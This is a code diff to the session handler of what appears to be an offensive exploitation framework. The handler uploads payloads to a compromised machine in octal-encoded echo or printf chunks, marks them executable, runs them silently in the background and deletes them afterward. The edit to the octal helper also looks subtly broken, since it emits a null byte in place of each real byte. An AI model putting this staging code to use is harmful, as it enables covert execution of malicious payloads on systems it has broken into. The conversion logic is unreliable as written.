@@ -62,10 +62,10 @@ class Handler(TCP):
             self.badges.output_error("Failed to handle session!")
             return None
 
-    def bytes_to_octal(self, bytes_obj):
+    def bytes_to_octal(self, bytes_obj, extra_zero=False):
         byte_octals = []
         for byte in bytes_obj:
-            byte_octal = '\\' + oct(byte)[2:]
+            byte_octal = '\\0' if extra_zero else '\\' + oct(byte)[2:]
             byte_octals.append(byte_octal)
         return ''.join(byte_octals)
 
@@ -90,9 +90,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}\n".encode())
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
         else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}")
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
         requests.delete(wget_container)
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
@@ -108,7 +108,7 @@ class Handler(TCP):
 
         for i in range(0, num_parts):
             current = i * echo_max_length
-            block = self.bytes_to_octal(payload[current:current + echo_max_length])
+            block = self.bytes_to_octal(payload[current:current + echo_max_length], extra_zero=True)
             command = echo_stream.format(block, path)
 
             self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
@@ -121,9 +121,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}\n".encode())
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
         else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}")
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
     
     def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
@@ -151,9 +151,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}\n".encode())
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
         else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}")
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
@@ -162,7 +162,7 @@ class Handler(TCP):
         session.details['Platform'] = payload['Platform']
         return session
 
-    def handle_session(self, host, port, payload, sender=None, args=[], delim=';', location='/tmp', timeout=None, method=None, post="echo"):
+    def handle_session(self, host, port, payload, sender=None, args=[], delim=';', location='/tmp', timeout=None, method=None, post="printf"):
         if payload['Payload'] is None:
             self.badges.output_error("Payload stage is not found!")
             return False
